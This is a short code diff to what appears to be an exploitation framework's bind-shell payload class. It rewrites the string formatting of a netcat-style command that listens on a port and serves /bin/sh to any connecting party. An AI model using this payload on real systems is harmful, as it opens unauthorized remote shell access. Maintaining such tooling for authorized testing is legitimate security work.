@@ -15,6 +15,4 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
     shell_binary = OptString("/bin/sh", "Shell")
 
     def generate(self):
-        return "{} -lvp {} -e {}".format(self.cmd,
-                                         self.rport,
-                                         self.shell_binary)
+        return f"{self.cmd} -lvp {self.rport} -e {self.shell_binary}"
